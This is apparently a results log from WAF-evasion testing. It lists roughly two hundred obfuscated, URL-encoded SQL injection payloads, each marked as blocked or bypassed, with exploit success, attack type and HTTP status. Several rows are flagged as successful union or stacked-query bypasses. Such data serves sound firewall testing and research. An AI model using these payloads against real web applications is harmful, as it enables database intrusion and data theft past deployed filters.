Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@!=.1+||+not%0b1=+(not~false)+||',Bypassed,No,None,Unknown,0.014,73.52,No,500
0'<@=1%0bor%0bnot+{x+(select+1)}=1=+(!+{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0254,73.52,No,500
0'<@!=1+or%0bnot+true=+(not+{`if`%0b1}=1)+||%27,Bypassed,No,None,booleanAtk,0.0162,73.52,No,500
0'<@!=1.+||%0bnot%0b{x+(select+1)}=1=+(not+{a%0b1}=1)+,Blocked,No,None,Unknown,0.0049,73.52,No,403
0%27<@=1+||+0=+(not%0b{x+(select%0b1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0162,73.52,No,200
0'<@!=1%0bor%0b!+{a+1}=1=%0b(!~false)%23,Bypassed,No,None,piggyAtk,0.0158,73.52,No,500
0%27<@!=.1+||%0bnot+{a%0b1}=1=%0b(not+{`if`%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0114,73.52,No,500
0'<@=.1%0b||+not+{a+1}=1=+(false)+||',Bypassed,No,None,Unknown,0.0239,73.52,No,500
0'<@!=1.+or%0b!%0b{x%0b(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1,Blocked,No,None,Unknown,0.0073,73.52,No,403
0%27<@!=.1+||%0b!+true=+(!+{`if`+1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0159,73.52,No,200
0'<@=1.%0bor%0bnot%0b{`if`+1}=1=%0b(not%0b{x+(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0178,73.52,No,500
0'<@!=1.+or%0b!%0b{x%0b(select+1)}=1=+(not+true)%23,Blocked,No,None,piggyAtk,0.0089,73.52,No,403
0'||%0b@<@.+||+!+{`if`%0b1}=1=%0b(!+{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0118,73.52,No,500
0'<@=1.%0b||%0b!%0b{x%0b(select%0b1)}=1=+(false)+||',Bypassed,No,None,Unknown,0.0289,73.52,No,500
0'<@=.1%0b||%0bfalse=+(not+{`if`+1}=1)%23,Bypassed,No,None,piggyAtk,0.0176,73.52,No,500
0%27<@=.1+or%0b!+{a+1}=1=%0b(!+1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0281,73.52,No,200
0'<@!=1.%0bor+not%0b{x%0b(select%0b1)}=1=%0b(not+{`if`+1}=1)%0b,Bypassed,No,None,Unknown,0.0275,73.52,No,500
0'<@!=1%0b||%0b!+{a%0b1}=1=+(not%0b1)+or%27,Bypassed,No,None,Unknown,0.0204,73.52,No,500
0'<@!=.1+or+true+like%0b{`if`%0b1}=1+or',Bypassed,No,None,booleanAtk,0.0182,73.52,No,500
0%27<@!=.1%0b||+not%0b{x+(select+1)}=1=%0b(!%0b{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0104,73.52,No,200
0%27<@=.1+||+!+{x%0b(select+1)}=1=+(not+true)+or',Bypassed,No,None,booleanAtk,0.0231,73.52,No,500
0%27<@!=.1%0bor+!+{`if`%0b1}=1=+(!%0b{x%0b(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.016,73.52,No,200
0%27<@!=1.%0bor+!+{a%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0322,73.52,No,200
0'<@=1+||%0bnot%0b{x%0b(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.0231,73.52,No,403
0'<@!=1.+or+not%0b1=%0b(!+{`if`%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.009,73.52,No,500
0%27<@!=.1%0b||+!%0b1=+(not+{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0374,73.52,No,500
0'<@!=1.%0b||+!%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0146,73.52,No,500
0'<@!=1.%0b||+not%0b{`if`%0b1}=1=+(!%0b{x+(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0208,73.52,No,500
0'<@!=1+||%0b!%0b{x%0b(select+1)}=1=%0b(not+{x+(select%0b1)}=1,Blocked,No,None,Unknown,0.0215,73.52,No,403
0%27<@!=.1+or%0b!%0b{a%0b1}=1=+(not+{x+(select+1)}=1)+,Blocked,No,None,Unknown,0.0073,73.52,No,403
0%27<@=1.%0b||+!+{x+(select+1)}=1=%0b(not%0b{`if`%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0084,73.52,No,200
0%27<@=1.%0bor%0bnot+{x+(select+1)}=1=+(!+{`if`+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0181,73.52,No,200
0'<@=1%0b||+!%0b{`if`+1}=1=+(not+true)%23,Bypassed,No,None,piggyAtk,0.0129,73.52,No,500
0'||+!@<@.%0b||+not~false=%0b(not+{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0151,73.52,No,500
0%27<@!=1%0b||%0bnot+{a+1}=1=+(!+{x%0b(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.023,73.52,No,200
0'<@=1%0b||%0b!%0b1=+(false)+||%27,Bypassed,No,None,Unknown,0.0286,73.52,No,500
0%27<@=.1%0b||+!%0b{x+(select+1)}=1=%0b(not+{a+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0143,73.52,No,200
0%27<@=1.%0bor%0b!+{a+1}=1=+(not%7e0)%0b||',Bypassed,No,None,Unknown,0.0198,73.52,No,500
0'<@!=1.+||%0b!%0b{`if`+1}=1=+(not%0b{x+(select%0b1)}=1)--,Bypassed,No,None,piggyAtk,0.0228,73.52,No,500
0%27<@=1.%0bor+not+true=+(not+{x+(select+1)}=1)%0b||',Bypassed,No,None,booleanAtk,0.0118,73.52,No,500
0'<@!=1.%0b||+{x+(select+1)}=1%0blike+{a+1}=1%23,Bypassed,No,None,piggyAtk,0.0168,73.52,No,500
0'<@!=1+or%0bnot+{`if`+1}=1=%0b(not+true)%0b||',Bypassed,No,None,booleanAtk,0.0203,73.52,No,500
0'<@=.1+or+not%0b{a%0b1}=1=+(not%0b{x+(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0151,73.52,No,500
0%27<@!=1+||%0bnot+{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.0106,73.52,No,403
0'<@=1+||%0bnot%0b{`if`%0b1}=1=+(!+{x%0b(select%0b1)}=1)+,Bypassed,No,None,Unknown,0.0157,73.52,No,500
0'<@=1.+||+!+{`if`%0b1}=1=%0b(not+{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0096,73.52,No,500
0'||+!@<@%0b||%0b{x%0b(select%0b1)}=1+like%0b{a%0b1}=1+or%27,Bypassed,No,None,Unknown,0.0129,73.52,No,500
0'<@!=1.%0bor+!%0btrue=+(!+{a+1}=1)%0b||',Bypassed,No,None,booleanAtk,0.013,73.52,No,500
0%27<@!=1%0b||+not+{x%0b(select%0b1)}=1=+(not%7efalse)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0132,73.52,No,200
0'<@!=1.+||+!%0btrue=%0b(not%0b{x%0b(select%0b1)}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.0138,73.52,No,500
0%27<@=.1+||%0b!+{x+(select+1)}=1=+(!+{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.0184,73.52,No,403
0'<@=1.%0bor+!%0b{a%0b1}=1=%0b(not%0b{`if`+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.014,73.52,No,500
0'<@!=.1+or%0b!%0b{x%0b(select+1)}=1=+(not+true)--%0b,Blocked,No,None,piggyAtk,0.0081,73.52,No,403
0%27<@=.1%0b||%0b!%0b{a+1}=1=+(!%0btrue)%0bor',Bypassed,No,None,booleanAtk,0.0161,73.52,No,500
0'<@=.1%0b||+not+1=+(not+{x+(select+1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0189,73.52,No,500
0%27<@=.1+or%0bnot+{x+(select%0b1)}=1=%0b(not+{x%0b(select%0b1)}=1,Blocked,No,None,Unknown,0.0147,73.52,No,403
0%27<@=1+||%0bnot+{`if`+1}=1=+(not+{x%0b(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0187,73.52,No,200
0%27<@!=.1+||+not%0b{x+(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0166,73.52,No,200
0%27<@!=.1%0b||%0b!%0b{x+(select+1)}=1=+(!%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0132,73.52,No,200
0'<@=1.+or+!%0b{`if`%0b1}=1=%0b(!+1)+or%27,Bypassed,No,None,Unknown,0.0304,73.52,No,500
0'<@=1.+or%0bnot%0b{x+(select+1)}=1=+(not+{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0171,73.52,No,403
0'<@!=1%0b||+not+{x+(select+1)}=1=%0b(!+{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0367,73.52,No,500
0'<@!=.1%0bor%0bnot%0btrue=+(not~0)%0bor',Bypassed,No,None,booleanAtk,0.0208,73.52,No,500
0%27<@!=.1+or+!+{x+(select+1)}=1=+(!%0b{`if`%0b1}=1)+,Blocked,No,None,Unknown,0.022,73.52,No,403
0%27<@=1+or%0bnot+{x%0b(select+1)}=1=+(!%0b{`if`+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0241,73.52,No,200
0%27<@!=.1%0bor%0btrue+like+true+||',Bypassed,No,None,booleanAtk,0.0141,73.52,No,500
0%27<@=1.%0b||%0b!%0b{`if`%0b1}=1=+(!+true)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0341,73.52,No,200
0%27<@=.1+||+!%0b{`if`+1}=1=%0b(not+{x+(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0125,73.52,No,200
0'<@!=1%0bor+not+{a+1}=1=%0b(not+{x+(select%0b1)}=1)--,Bypassed,No,None,piggyAtk,0.0222,73.52,No,500
0'<@=1+||+!+{x+(select+1)}=1=%0b(!%0b{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.026,73.52,No,403
0%27<@!=1.%0bor+!%0b{x+(select%0b1)}=1%0bis+false--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0138,73.52,No,200
0%27<@=1+or%0bnot%0b{x+(select+1)}=1=+(!%0b{x+(select+1)}=1),Blocked,No,None,Unknown,0.0325,73.52,No,403
0%27<@!=1.+or+not%0b{`if`+1}=1=%0b(not+{x+(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0109,73.52,No,200
0'<@=1+or%0bnot%0b{x%0b(select+1)}=1=+(!%0b{x+(select%0b1)}=1),Blocked,No,None,Unknown,0.0167,73.52,No,403
0'<@!=1.+or%0bnot+{a%0b1}=1=+(!+true)+||%27,Blocked,No,None,booleanAtk,0.0114,73.52,No,403
0'<@!=.1%0bor%0b!+{`if`+1}=1=%0b(not+1)%0b||',Bypassed,No,None,Unknown,0.0177,73.52,No,500
0'<@=1+||%0bnot%0b{a+1}=1%0bis+false+||%27,Bypassed,No,None,Unknown,0.0174,73.52,No,500
0'<@!=1%0bor+not+{x+(select%0b1)}=1=+(not+{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0201,73.52,No,500
0%27<@!=.1+||%0b!+true=+(!%0b{a%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0137,73.52,No,200
0'<@=1.+||+not%0b{x%0b(select%0b1)}=1=+(!%0btrue)%0bor%27,Bypassed,No,None,booleanAtk,0.019,73.52,No,500
0%27<@=1+or%0bnot+{a%0b1}=1=%0b(!+{x+(select%0b1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0163,73.52,No,200
0'<@=.1+or%0btrue%0blike+{x+(select+1)}=1%0bor%27,Bypassed,No,None,booleanAtk,0.0176,73.52,No,500
0'<@!=1%0bor+not+{x+(select+1)}=1=+(!+{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0228,73.52,No,500
0%27<@=.1%0b||+!+{x+(select%0b1)}=1=+(not+1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0143,73.52,No,200
0'<@!=1.%0b||%0bnot+{x+(select+1)}=1=+(not%0b1)--+,Bypassed,No,None,piggyAtk,0.0212,73.52,No,500
0%27<@!=1+||%0bnot+{a%0b1}=1=%0b(not+{x%0b(select+1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0138,73.52,No,200
0%27<@=1%0bor%0b!~0=+(!+{`if`%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0226,73.52,No,200
0%27<@=1%0bor+not+{x%0b(select+1)}=1=%0b(not%0btrue)%23,Bypassed,Yes,unionAtk,piggyAtk,0.019,73.52,No,200
0%27<@=.1%0b||+not+{x%0b(select%0b1)}=1=+(not%0b{`if`%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0112,73.52,No,200
0'<@=1.+||+!%0b{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0295,73.52,No,500
0%27<@=.1+||+!%0b{`if`+1}=1=+(not%0b{x%0b(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0152,73.52,No,200
0'<@!=1.+||%0b!%7e0=+(not%0b{`if`%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0198,73.52,No,500
0'<@!=.1+or%0b{a+1}=1%0blike%0b{x+(select+1)}=1%0bor%27,Blocked,No,None,Unknown,0.0139,73.52,No,403
0%27<@!=.1+||+not%0b{a+1}=1=+(not%0b{`if`%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0192,73.52,No,200
0%27<@!=1+or+!+{x+(select+1)}=1=%0b(!%0b{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0122,73.52,No,403
0%27<@=1+||%0b!+{`if`+1}=1=%0b(not%0b1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0168,73.52,No,200
0%27<@=1.%0bor%0b{x+(select%0b1)}=1%0blike+{x+(select+1)}=1--+,Bypassed,Yes,unionAtk,piggyAtk,0.0282,73.52,No,200
0'<@!=.1+||+not+{x+(select%0b1)}=1=%0b(not+{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.0129,73.52,No,403
0'<@=.1%0bor+!%0b{`if`%0b1}=1=+(!+{x+(select+1)}=1)--,Bypassed,No,None,piggyAtk,0.0128,73.52,No,500
0'<@!=1.+or%0b!+{x%0b(select+1)}=1=+(!+{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0147,73.52,No,500
0'<@=1%0b||%0bnot+{x%0b(select%0b1)}=1=+(not+{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0166,73.52,No,500
0'<@=1.+||%0bnot%0b{x+(select%0b1)}=1=%0b(0)--%0b,Blocked,No,None,piggyAtk,0.0129,73.52,No,403
0'<@=1%0b||+!%0b{x%0b(select+1)}=1=+(not+{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0217,73.52,No,500
0%27<@=.1%0b||%0bnot%7e0=%0b(!~false)+||%27,Bypassed,Yes,unionAtk,Unknown,0.015,73.52,No,200
0%27<@=.1%0bor%0bnot%0b{x%0b(select+1)}=1=%0b(!~false)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0115,73.52,No,200
0%27<@=1.+||%0bnot%0b1=+(!+1)+or',Bypassed,No,None,Unknown,0.008,73.52,No,500
0%27||%0b1<@.%0bor%0bnot%0b{x+(select+1)}=1=+(!%0b{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.018,73.52,No,200
0'<@!=1+or+!+1=+(not%0btrue)%0bor%27,Bypassed,No,None,booleanAtk,0.0186,73.52,No,500
0%27<@!=1.%0bor+{x+(select%0b1)}=1+like%0b{x%0b(select+1)}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0127,73.52,No,200
0%27<@!=1.+or%0b!+{x+(select%0b1)}=1=+(!+{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0291,73.52,No,403
0'<@!=1.+||+!~false=+(!+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0144,73.52,No,500
0%27<@=.1%0b||+not+{x%0b(select%0b1)}=1=+(!%0b{`if`+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0201,73.52,No,200
0'<@!=1.+or+!%0b{x+(select%0b1)}=1=%0b(!%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0194,73.52,No,500
0%27<@!=1.+or%0b!+{a+1}=1=%0b(!+1)+or',Bypassed,No,None,Unknown,0.0147,73.52,No,500
0'<@!=1.+||+not~false=+(not+{a+1}=1)%0bor%27,Blocked,No,None,booleanAtk,0.0172,73.52,No,403
0%27or%0b@<@.%0bor%0bnot+{x%0b(select%0b1)}=1=%0b(!+{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0242,73.52,No,200
0'<@=1.+or%0bnot+{`if`+1}=1=%0b(not+{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0159,73.52,No,500
0'<@!=.1%0bor+not+{`if`%0b1}=1=%0b(!%0b{x+(select+1)}=1)+,Bypassed,No,None,Unknown,0.0206,73.52,No,500
0%27<@!=.1%0b||%0bnot%0btrue=+(!+{a%0b1}=1)%0bor',Bypassed,No,None,booleanAtk,0.0162,73.52,No,500
0'<@=.1+or%0bnot%0b{x+(select+1)}=1=%0b(!+{`if`+1}=1)--,Blocked,No,None,piggyAtk,0.0125,73.52,No,403
0'or%0b!@<@+or+true+like+{x%0b(select+1)}=1+||',Bypassed,No,None,booleanAtk,0.0168,73.52,No,500
0'<@!=.1%0b||%0bnot%0b{x+(select+1)}=1=+(not+{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0161,73.52,No,500
0%27<@!=.1%0b||+!+{x+(select+1)}=1=%0b(0)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0145,73.52,No,200
0%27<@=1.%0b||%0bnot%0b{a%0b1}=1=%0b(!+{x%0b(select%0b1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.027,73.52,No,200
0%27<@=.1+or%0bnot+{x+(select%0b1)}=1=+(not%7e0)%23,Blocked,No,None,piggyAtk,0.009,73.52,No,403
0%27<@!=1%0b||+not%0b{x+(select+1)}=1=+(0)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0104,73.52,No,200
0%27<@!=1+||+not%0b{`if`%0b1}=1=+(!%0b1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0123,73.52,No,200
0%27<@=.1%0b||%0bnot%0b{x+(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0127,73.52,No,200
0%27<@=1.+or%0bnot+{`if`+1}=1=+(!+{`if`%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0245,73.52,No,500
0'<@!=.1%0bor%0b1%0blike%0b{a+1}=1+||',Bypassed,No,None,Unknown,0.0079,73.52,No,500
0%27<@=.1%0bor+!+{x+(select%0b1)}=1=%0b(false)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.015,73.52,No,200
0'<@!=1%0b||%0bnot+true=+(not+{a+1}=1)+||',Bypassed,No,None,Unknown,0.0217,73.52,No,500
0'<@=.1+||+!+{a%0b1}=1=+(not%0b{a+1}=1)--+,Bypassed,No,None,piggyAtk,0.0245,73.52,No,500
0%27<@!=1.+or+not+{x%0b(select+1)}=1=%0b(!%0b{a%0b1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0255,73.52,No,200
0%27<@!=.1+||+!%7efalse=+(not+true)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0251,73.52,No,200
0%27<@=.1+or+not%0btrue=+(!+{a+1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0213,73.52,No,200
0'<@!=.1+||+not+{`if`+1}=1=+(not%0b{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0116,73.52,No,500
0%27<@!=1.%0bor%0b!+true=+(!%0b{x+(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0146,73.52,No,200
0%27<@!=1+||%0bnot~0=+(!+{x+(select%0b1)}=1)%0b||',Blocked,No,None,Unknown,0.0212,73.52,No,403
0'or+@<@.+or+not+{`if`+1}=1+is%0bfalse%0b||',Bypassed,No,None,booleanAtk,0.0214,73.52,No,500
0'<@=1.%0bor+!%0b{x%0b(select+1)}=1=+(not+{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0242,73.52,No,500
0%27<@!=1+||+not%0b{`if`+1}=1=+(!+{a+1}=1)+||',Bypassed,No,None,Unknown,0.0161,73.52,No,500
0'<@!=1.+||%0b{x%0b(select+1)}=1+like+{x+(select+1)}=1%0b||%27,Bypassed,No,None,Unknown,0.0131,73.52,No,500
0%27<@!=.1+or%0bnot%0b{a%0b1}=1=%0b(!%0b1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0155,73.52,No,200
0%27<@=1.%0b||%0b!+{x+(select%0b1)}=1=+(!+{a+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0157,73.52,No,200
0'<@=1.+||+!%0b{`if`%0b1}=1=+(not+{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0365,73.52,No,500
0%27<@!=1+||%0bnot%0btrue=%0b(not+1)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0221,73.68,No,200
0'<@!=1+or+not+{a+1}=1=+(not%0b{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0175,73.83,No,500
0%27<@!=1+or+not%0b{x+(select%0b1)}=1=+(!~0)+||%27,Bypassed,Yes,unionAtk,Unknown,0.021,73.83,No,200
0%27<@=1+||+not%0b{`if`+1}=1=+(not+{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0239,73.83,No,200
0'<@!=.1+||%0b!+{`if`+1}=1=+(!%0btrue)+or',Bypassed,No,None,booleanAtk,0.0145,73.83,No,500
0%27<@!=.1%0b||%0bnot+{x+(select%0b1)}=1=%0b(!+{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0238,73.83,No,200
0%27<@!=1+or%0bnot%0b{a+1}=1=%0b(not%0btrue)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0222,73.83,No,200
0'<@!=1.%0b||%0bnot%0b{a%0b1}=1=%0b(!%0b{`if`+1}=1)+||%27,Bypassed,No,None,Unknown,0.0212,73.83,No,500
0'<@!=1%0bor+not+{x+(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0332,73.83,No,500
0'<@=.1+||+not+{x%0b(select+1)}=1=+(not~false)%0b||',Bypassed,No,None,Unknown,0.0098,73.83,No,500
0%27<@=1+or%0bnot%0b{`if`+1}=1=%0b(!~0)%0bor',Bypassed,No,None,Unknown,0.0108,73.83,No,500
0'<@=1.+or%0b!+{a+1}=1=%0b(!+{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0273,73.83,No,500
0'<@!=1.%0bor+not+{a%0b1}=1=+(!%0btrue)--+,Bypassed,No,None,piggyAtk,0.0195,73.83,No,500
0%27<@!=1.+||+!+{a%0b1}=1=%0b(!+{a%0b1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.015,73.83,No,200
0'<@=.1+or+not+true=+(not~0)+||%27,Blocked,No,None,booleanAtk,0.0089,73.83,No,403
0%27<@=1%0b||+not+{a%0b1}=1=%0b(not+{x+(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.016,73.83,No,200
0'<@!=1.+or%0b!+{x%0b(select+1)}=1=%0b(false)+||%27,Bypassed,No,None,booleanAtk,0.0123,73.83,No,500
0'<@=.1%0bor+!+{`if`+1}=1=+(!%0b{a+1}=1)+or%27,Bypassed,No,None,Unknown,0.0154,73.83,No,500
0'<@!=.1+||%0bnot+1=+(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0103,73.83,No,500
0'<@!=.1%0b||+!+true=+(not%0btrue)+or',Bypassed,No,None,booleanAtk,0.0174,73.83,No,500
0'<@!=1.+or%0b!+true=+(not%0b1)%0bor%27,Bypassed,No,None,booleanAtk,0.0119,73.83,No,500
0%27<@=1+or+{x+(select+1)}=1%0blike%0b{`if`+1}=1+or%27,Blocked,No,None,Unknown,0.0063,73.83,No,403
0%27<@=1.+||%0bnot+{a%0b1}=1=%0b(!%0btrue)+or',Bypassed,No,None,booleanAtk,0.0196,73.83,No,500
0'<@!=1+||+!+{`if`%0b1}=1=+(not+{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0243,73.83,No,500
0%27<@!=.1+||+!%0b{x+(select+1)}=1=+(not+{a+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0189,73.83,No,200
0%27<@!=1+or+{x+(select%0b1)}=1+like+{a%0b1}=1%0b||%27,Blocked,No,None,Unknown,0.0319,73.52,No,403
0'<@=1%0b||+{x%0b(select+1)}=1+like%0b{x+(select+1)}=1--+,Bypassed,No,None,piggyAtk,0.0185,73.52,No,500
0%27<@=1+||+false=%0b(not%7e0)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0166,73.52,No,200
0'<@=1.%0bor+not+{a+1}=1=%0b(not%0b{x+(select%0b1)}=1)+,Bypassed,No,None,Unknown,0.017,73.52,No,500
0%27<@=.1%0bor%0bnot+{x+(select%0b1)}=1=%0b(false)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0184,73.52,No,200
0%27<@=1.+||+not%0b{x%0b(select+1)}=1=%0b(!+{`if`+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.025,73.52,No,200
0%27or+!@<@%0bor%0b1+like+true+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0245,73.52,No,200
0%27<@!=1+or%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0169,73.52,No,200
0'<@=.1+or+not%0b{x+(select+1)}=1=+(!%0b{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0204,73.52,No,500
0%27<@=1.%0bor%0bnot%0b1=+(!+{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0225,73.52,No,500
0'<@!=1.%0bor+not%0b{x+(select+1)}=1=+(!%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.017,73.52,No,500
0'<@=1+||+!%0b{a%0b1}=1=%0b(!%0b1)--%0b,Bypassed,No,None,piggyAtk,0.041,73.52,No,500
0%27<@=1.+||+!+{a+1}=1=%0b(!%0b{`if`%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.022,73.52,No,200
0%27<@!=1.%0bor+not%0b{x+(select+1)}=1=+(!+{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0174,73.52,No,200
0'<@=.1+or%0bnot+true=%0b(not%0b{x%0b(select+1)}=1)+||',Bypassed,No,None,booleanAtk,0.0179,73.52,No,500
0%27<@!=.1+||+!+{x%0b(select+1)}=1=+(!%0b{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.013,73.52,No,200
0'<@!=1.+or+0=+(not%0b{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0179,73.52,No,500
0'<@!=1.+||+!+{`if`+1}=1=%0b(not+{`if`+1}=1)--+,Bypassed,No,None,piggyAtk,0.0277,73.52,No,500
0'<@!=1.+or+not%0b{x+(select+1)}=1=%0b(!+{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0182,73.52,No,500
